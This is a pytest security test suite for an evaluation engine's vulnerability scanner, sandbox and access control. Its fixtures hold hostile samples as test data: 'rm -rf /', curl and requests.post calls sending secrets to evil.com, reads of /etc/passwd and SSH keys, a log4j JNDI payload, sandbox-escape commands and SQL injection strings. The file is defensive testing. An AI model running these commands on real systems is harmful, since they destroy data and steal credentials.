"""
Security vulnerability tests and penetration testing.
"""

import pytest
import json
import subprocess
import tempfile
import os
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

from evaluation_engine.security.vulnerability_scanner import VulnerabilityScanner
from evaluation_engine.security.access_control import AccessControlManager
from evaluation_engine.security.incident_detector import IncidentDetector
from evaluation_engine.core.sandbox_executor import SandboxExecutor


class TestSecurityVulnerabilities:
    """Test security vulnerabilities and defenses."""

    @pytest.fixture
    def vulnerability_scanner(self):
        """Vulnerability scanner instance."""
        return VulnerabilityScanner()

    @pytest.fixture
    def access_control_manager(self):
        """Access control manager instance."""
        return AccessControlManager()

    @pytest.fixture
    def incident_detector(self):
        """Incident detector instance."""
        return IncidentDetector()

    @pytest.fixture
    def malicious_code_samples(self):
        """Sample malicious code for testing."""
        return {
            "command_injection": [
                "import os; os.system('rm -rf /')",
                "subprocess.call(['curl', 'http://malicious.com/steal_data'])",
                "__import__('os').system('cat /etc/passwd')",
                "exec('import socket; socket.create_connection((\"evil.com\", 80))')"
            ],
            "file_system_access": [
                "open('/etc/passwd', 'r').read()",
                "with open('/home/user/.ssh/id_rsa', 'r') as f: f.read()",
                "import shutil; shutil.rmtree('/important_data')",
                "os.remove('/etc/hosts')"
            ],
            "network_access": [
                "import urllib.request; urllib.request.urlopen('http://evil.com')",
                "import socket; socket.socket().connect(('malicious.com', 80))",
                "import requests; requests.post('http://evil.com', data=secrets)",
                "import smtplib; smtplib.SMTP().sendmail('evil@bad.com', ['victim@good.com'], 'spam')"
            ],
            "code_injection": [
                "eval(user_input)",
                "exec(malicious_code)",
                "compile(untrusted_source, '<string>', 'exec')",
                "__import__('builtins').eval(dangerous_input)"
            ],
            "resource_exhaustion": [
                "while True: pass  # Infinite loop",
                "[0] * (10**9)  # Memory bomb",
                "open('/dev/urandom', 'rb').read(10**9)  # Disk space exhaustion",
                "import threading; [threading.Thread(target=lambda: None).start() for _ in range(10000)]"
            ]
        }

    @pytest.mark.security
    def test_code_injection_detection(self, vulnerability_scanner, malicious_code_samples):
        """Test detection of code injection vulnerabilities."""
        for category, samples in malicious_code_samples.items():
            for code in samples:
                scan_result = vulnerability_scanner.scan_code(code)
                
                assert scan_result["has_vulnerabilities"] is True
                assert len(scan_result["vulnerabilities"]) > 0
                
                # Check that the specific vulnerability type is detected
                vulnerability_types = [v["type"] for v in scan_result["vulnerabilities"]]
                assert any(vuln_type in ["code_injection", "command_injection", "dangerous_function"] 
                          for vuln_type in vulnerability_types)

    @pytest.mark.security
    def test_safe_code_approval(self, vulnerability_scanner):
        """Test that safe code passes security scanning."""
        safe_code_samples = [
            "def add(a, b): return a + b",
            "import math; result = math.sqrt(16)",
            "data = [1, 2, 3, 4, 5]; sum(data)",
            "class Calculator: def multiply(self, x, y): return x * y",
            "def fibonacci(n): return n if n <= 1 else fibonacci(n-1) + fibonacci(n-2)"
        ]
        
        for code in safe_code_samples:
            scan_result = vulnerability_scanner.scan_code(code)
            
            # Safe code should pass security scan
            assert scan_result["has_vulnerabilities"] is False
            assert len(scan_result["vulnerabilities"]) == 0
            assert scan_result["risk_level"] == "low"

    @pytest.mark.security
    def test_sql_injection_protection(self, vulnerability_scanner):
        """Test SQL injection detection and protection."""
        sql_injection_samples = [
            "query = f\"SELECT * FROM users WHERE id = '{user_id}'\"",
            "cursor.execute(\"SELECT * FROM data WHERE name = '\" + user_input + \"'\")",
            "db.query(f\"DELETE FROM table WHERE condition = {untrusted_input}\")",
            "sql = \"INSERT INTO logs VALUES ('\" + log_data + \"')\""
        ]
        
        for code in sql_injection_samples:
            scan_result = vulnerability_scanner.scan_code(code)
            
            assert scan_result["has_vulnerabilities"] is True
            vulnerability_types = [v["type"] for v in scan_result["vulnerabilities"]]
            assert "sql_injection" in vulnerability_types or "string_formatting_vulnerability" in vulnerability_types

    @pytest.mark.security
    def test_xss_vulnerability_detection(self, vulnerability_scanner):
        """Test XSS vulnerability detection."""
        xss_samples = [
            "html = f\"<div>{user_input}</div>\"",
            "response = \"<script>\" + user_data + \"</script>\"",
            "template = f\"<p>Hello {username}</p>\"",
            "output = \"<html><body>\" + unsafe_content + \"</body></html>\""
        ]
        
        for code in xss_samples:
            scan_result = vulnerability_scanner.scan_code(code)
            
            assert scan_result["has_vulnerabilities"] is True
            vulnerability_types = [v["type"] for v in scan_result["vulnerabilities"]]
            assert any("xss" in vuln_type.lower() or "html_injection" in vuln_type.lower() 
                      for vuln_type in vulnerability_types)

    @pytest.mark.security
    @pytest.mark.requires_docker
    def test_sandbox_escape_prevention(self, temp_dir):
        """Test prevention of sandbox escape attempts."""
        with patch('docker.from_env') as mock_docker:
            # Mock Docker client and container
            mock_client = Mock()
            mock_container = Mock()
            mock_container.id = "test_container_123"
            mock_container.status = "running"
            
            # Simulate sandbox escape attempts
            escape_attempts = [
                "import os; os.system('docker exec -it $(hostname) /bin/bash')",
                "with open('/proc/1/cgroup', 'r') as f: f.read()",  # Container detection
                "import subprocess; subprocess.run(['mount', '-t', 'proc', 'proc', '/host_proc'])",
                "os.system('echo \"malicious\" > /host/etc/passwd')"
            ]
            
            # Configure mock to detect escape attempts
            def mock_exec_run(cmd, **kwargs):
                if any(dangerous in cmd for dangerous in ['docker', 'mount', '/host', '/proc/1']):
                    # Simulate security violation detection
                    return Mock(exit_code=1, output=b"Security violation detected")
                return Mock(exit_code=0, output=b"Safe execution")
            
            mock_container.exec_run.side_effect = mock_exec_run
            mock_client.containers.run.return_value = mock_container
            mock_docker.return_value = mock_client
            
            sandbox = SandboxExecutor()
            
            for escape_code in escape_attempts:
                result = sandbox.execute_code(escape_code, language="python")
                
                # Sandbox should detect and prevent escape attempts
                assert result["success"] is False
                assert "security_violation" in result
                assert result["security_violation"] is True

    @pytest.mark.security
    def test_access_control_enforcement(self, access_control_manager):
        """Test access control enforcement."""
        # Test user roles and permissions
        test_users = [
            {"user_id": "admin_user", "role": "admin", "permissions": ["read", "write", "execute", "admin"]},
            {"user_id": "eval_user", "role": "evaluator", "permissions": ["read", "write", "execute"]},
            {"user_id": "view_user", "role": "viewer", "permissions": ["read"]},
            {"user_id": "guest_user", "role": "guest", "permissions": []}
        ]
        
        for user in test_users:
            access_control_manager.register_user(user["user_id"], user["role"], user["permissions"])
        
        # Test permission checks
        test_cases = [
            ("admin_user", "admin", True),
            ("admin_user", "execute", True),
            ("eval_user", "execute", True),
            ("eval_user", "admin", False),
            ("view_user", "read", True),
            ("view_user", "write", False),
            ("guest_user", "read", False)
        ]
        
        for user_id, permission, expected in test_cases:
            has_permission = access_control_manager.check_permission(user_id, permission)
            assert has_permission == expected, f"User {user_id} permission {permission} check failed"

    @pytest.mark.security
    def test_authentication_bypass_prevention(self, access_control_manager):
        """Test prevention of authentication bypass attempts."""
        # Test various bypass attempts
        bypass_attempts = [
            {"user_id": "admin", "token": "fake_token"},
            {"user_id": "'; DROP TABLE users; --", "token": "sql_injection"},
            {"user_id": "../admin", "token": "path_traversal"},
            {"user_id": "admin\x00", "token": "null_byte_injection"},
            {"user_id": "admin' OR '1'='1", "token": "sql_injection_2"}
        ]
        
        for attempt in bypass_attempts:
            # All bypass attempts should fail authentication
            is_authenticated = access_control_manager.authenticate_user(
                attempt["user_id"], 
                attempt["token"]
            )
            assert is_authenticated is False

    @pytest.mark.security
    def test_input_validation_security(self, vulnerability_scanner):
        """Test input validation for security vulnerabilities."""
        # Test various malicious inputs
        malicious_inputs = [
            {"input": "<script>alert('xss')</script>", "type": "xss"},
            {"input": "'; DROP TABLE users; --", "type": "sql_injection"},
            {"input": "../../../etc/passwd", "type": "path_traversal"},
            {"input": "${jndi:ldap://evil.com/exploit}", "type": "log4j_injection"},
            {"input": "{{7*7}}", "type": "template_injection"},
            {"input": "\x00admin", "type": "null_byte_injection"}
        ]
        
        for test_case in malicious_inputs:
            validation_result = vulnerability_scanner.validate_input(test_case["input"])
            
            assert validation_result["is_safe"] is False
            assert validation_result["threat_type"] == test_case["type"] or \
                   test_case["type"] in validation_result["detected_threats"]

    @pytest.mark.security
    def test_data_sanitization(self, vulnerability_scanner):
        """Test data sanitization functions."""
        test_cases = [
            {
                "input": "<script>alert('xss')</script>Hello World",
                "expected_output": "Hello World",
                "sanitization_type": "html"
            },
            {
                "input": "'; DROP TABLE users; -- SELECT * FROM data",
                "expected_output": "SELECT * FROM data",
                "sanitization_type": "sql"
            },
            {
                "input": "../../../etc/passwd",
                "expected_output": "passwd",
                "sanitization_type": "path"
            }
        ]
        
        for test_case in test_cases:
            sanitized = vulnerability_scanner.sanitize_input(
                test_case["input"], 
                test_case["sanitization_type"]
            )
            
            # Sanitized output should be safe
            validation_result = vulnerability_scanner.validate_input(sanitized)
            assert validation_result["is_safe"] is True
            
            # Should remove malicious content but preserve legitimate content
            assert test_case["expected_output"] in sanitized

    @pytest.mark.security
    def test_rate_limiting_security(self, access_control_manager):
        """Test rate limiting for security."""
        user_id = "test_user"
        access_control_manager.register_user(user_id, "evaluator", ["read", "write"])
        
        # Test rate limiting
        rate_limit = 10  # 10 requests per minute
        access_control_manager.set_rate_limit(user_id, rate_limit, window_minutes=1)
        
        # Make requests up to the limit
        for i in range(rate_limit):
            allowed = access_control_manager.check_rate_limit(user_id)
            assert allowed is True
        
        # Next request should be rate limited
        allowed = access_control_manager.check_rate_limit(user_id)
        assert allowed is False

    @pytest.mark.security
    def test_incident_detection_and_response(self, incident_detector):
        """Test security incident detection and response."""
        # Simulate various security incidents
        incidents = [
            {
                "type": "brute_force_attack",
                "details": {"user_id": "admin", "failed_attempts": 10, "source_ip": "192.168.1.100"}
            },
            {
                "type": "code_injection_attempt",
                "details": {"code": "os.system('rm -rf /')", "user_id": "malicious_user"}
            },
            {
                "type": "unauthorized_access",
                "details": {"resource": "/admin/users", "user_id": "guest_user"}
            },
            {
                "type": "data_exfiltration_attempt",
                "details": {"data_size": "100MB", "destination": "external_server"}
            }
        ]
        
        for incident in incidents:
            # Report incident
            incident_id = incident_detector.report_incident(
                incident["type"], 
                incident["details"]
            )
            
            assert incident_id is not None
            
            # Check incident response
            response = incident_detector.get_incident_response(incident_id)
            
            assert response["status"] == "detected"
            assert response["severity"] in ["low", "medium", "high", "critical"]
            assert "response_actions" in response
            assert len(response["response_actions"]) > 0

    @pytest.mark.security
    def test_encryption_security(self, temp_dir):
        """Test encryption and decryption security."""
        from evaluation_engine.security.encryption_manager import EncryptionManager
        
        encryption_manager = EncryptionManager()
        
        # Test data encryption
        sensitive_data = {
            "api_key": "secret_api_key_12345",
            "user_credentials": {"username": "admin", "password": "super_secret"},
            "evaluation_results": {"model_performance": 0.95, "private_data": "confidential"}
        }
        
        # Encrypt data
        encrypted_data = encryption_manager.encrypt_data(json.dumps(sensitive_data))
        
        # Verify encryption
        assert encrypted_data != json.dumps(sensitive_data)
        assert "secret_api_key" not in encrypted_data
        assert "super_secret" not in encrypted_data
        
        # Decrypt data
        decrypted_data = encryption_manager.decrypt_data(encrypted_data)
        decrypted_obj = json.loads(decrypted_data)
        
        # Verify decryption
        assert decrypted_obj == sensitive_data
        
        # Test file encryption
        sensitive_file = temp_dir / "sensitive_data.json"
        with open(sensitive_file, 'w') as f:
            json.dump(sensitive_data, f)
        
        # Encrypt file
        encrypted_file = encryption_manager.encrypt_file(str(sensitive_file))
        
        # Verify file is encrypted
        with open(encrypted_file, 'rb') as f:
            encrypted_content = f.read()
            assert b"secret_api_key" not in encrypted_content
        
        # Decrypt file
        decrypted_file = encryption_manager.decrypt_file(encrypted_file)
        
        with open(decrypted_file, 'r') as f:
            decrypted_content = json.load(f)
            assert decrypted_content == sensitive_data

    @pytest.mark.security
    def test_secure_communication(self, api_client):
        """Test secure communication protocols."""
        # Test HTTPS enforcement
        with patch('evaluation_engine.api.server.app') as mock_app:
            # Simulate HTTP request (should be redirected to HTTPS)
            response = api_client.get("/api/v1/tasks", headers={"X-Forwarded-Proto": "http"})
            
            # Should enforce HTTPS
            assert response.status_code in [301, 302, 426]  # Redirect or Upgrade Required
        
        # Test secure headers
        response = api_client.get("/api/v1/health")
        
        # Check for security headers
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "X-XSS-Protection",
            "Strict-Transport-Security"
        ]
        
        for header in security_headers:
            assert header in response.headers

    @pytest.mark.security
    def test_dependency_vulnerability_scanning(self, temp_dir):
        """Test scanning for vulnerable dependencies."""
        # Create a requirements file with known vulnerable packages
        requirements_content = """
        requests==2.20.0  # Known vulnerability CVE-2018-18074
        flask==0.12.0     # Multiple known vulnerabilities
        pyyaml==3.12      # Known vulnerability CVE-2017-18342
        """
        
        requirements_file = temp_dir / "requirements.txt"
        with open(requirements_file, 'w') as f:
            f.write(requirements_content)
        
        # Mock vulnerability scanner
        scanner = VulnerabilityScanner()
        
        # Scan dependencies
        scan_result = scanner.scan_dependencies(str(requirements_file))
        
        # Should detect vulnerabilities
        assert scan_result["has_vulnerabilities"] is True
        assert len(scan_result["vulnerable_packages"]) > 0
        
        # Check specific vulnerabilities
        vulnerable_packages = {pkg["name"]: pkg for pkg in scan_result["vulnerable_packages"]}
        
        assert "requests" in vulnerable_packages
        assert "flask" in vulnerable_packages
        assert "pyyaml" in vulnerable_packages
        
        # Each vulnerable package should have CVE information
        for pkg_name, pkg_info in vulnerable_packages.items():
            assert "cves" in pkg_info
            assert len(pkg_info["cves"]) > 0
            assert "severity" in pkg_info

    @pytest.mark.security
    def test_secure_file_handling(self, temp_dir, vulnerability_scanner):
        """Test secure file handling practices."""
        # Test path traversal prevention
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "....//....//....//etc/passwd"
        ]
        
        for dangerous_path in dangerous_paths:
            is_safe = vulnerability_scanner.validate_file_path(dangerous_path, str(temp_dir))
            assert is_safe is False
        
        # Test safe paths
        safe_paths = [
            "data/test_file.json",
            "results/evaluation_123.json",
            "cache/model_cache.pkl"
        ]
        
        for safe_path in safe_paths:
            is_safe = vulnerability_scanner.validate_file_path(safe_path, str(temp_dir))
            assert is_safe is True
        
        # Test file type validation
        allowed_extensions = [".json", ".jsonl", ".csv", ".txt", ".yml", ".yaml"]
        dangerous_extensions = [".exe", ".bat", ".sh", ".py", ".js", ".php"]
        
        for ext in allowed_extensions:
            is_allowed = vulnerability_scanner.validate_file_extension(f"test{ext}")
            assert is_allowed is True
        
        for ext in dangerous_extensions:
            is_allowed = vulnerability_scanner.validate_file_extension(f"malicious{ext}")
            assert is_allowed is False

    @pytest.mark.security
    def test_memory_safety(self, temp_dir):
        """Test memory safety and prevent memory-based attacks."""
        # Test buffer overflow prevention
        large_input = "A" * (10**6)  # 1MB string
        
        scanner = VulnerabilityScanner()
        
        # Should handle large inputs safely
        result = scanner.scan_code(f"data = '{large_input}'")
        assert result is not None  # Should not crash
        
        # Test memory exhaustion prevention
        memory_bomb_code = "[0] * (10**9)"  # Would allocate ~40GB
        
        result = scanner.scan_code(memory_bomb_code)
        assert result["has_vulnerabilities"] is True
        
        vulnerability_types = [v["type"] for v in result["vulnerabilities"]]
        assert "resource_exhaustion" in vulnerability_types or "memory_bomb" in vulnerability_types

    @pytest.mark.security
    @pytest.mark.slow
    def test_penetration_testing_simulation(self, api_client, security_test_payloads):
        """Simulate penetration testing attacks."""
        # Test various attack vectors
        attack_results = {}
        
        # SQL Injection attacks
        for payload in security_test_payloads["sql_injection"]:
            response = api_client.get(f"/api/v1/tasks?search={payload}")
            attack_results[f"sql_injection_{payload[:10]}"] = {
                "status_code": response.status_code,
                "blocked": response.status_code in [400, 403, 422]
            }
        
        # XSS attacks
        for payload in security_test_payloads["xss"]:
            response = api_client.post("/api/v1/tasks", json={
                "task_id": "test_task",
                "description": payload,
                "task_type": "single_turn"
            })
            attack_results[f"xss_{payload[:10]}"] = {
                "status_code": response.status_code,
                "blocked": response.status_code in [400, 403, 422]
            }
        
        # Command injection attacks
        for payload in security_test_payloads["command_injection"]:
            response = api_client.post("/api/v1/evaluations", json={
                "task_ids": [payload],
                "model_id": "test_model"
            })
            attack_results[f"cmd_injection_{payload[:10]}"] = {
                "status_code": response.status_code,
                "blocked": response.status_code in [400, 403, 422]
            }
        
        # Verify that most attacks were blocked
        blocked_attacks = sum(1 for result in attack_results.values() if result["blocked"])
        total_attacks = len(attack_results)
        
        block_rate = blocked_attacks / total_attacks
        assert block_rate > 0.8  # Should block at least 80% of attacks
        
        # No attack should result in server error (500)
        server_errors = sum(1 for result in attack_results.values() if result["status_code"] >= 500)
        assert server_errors == 0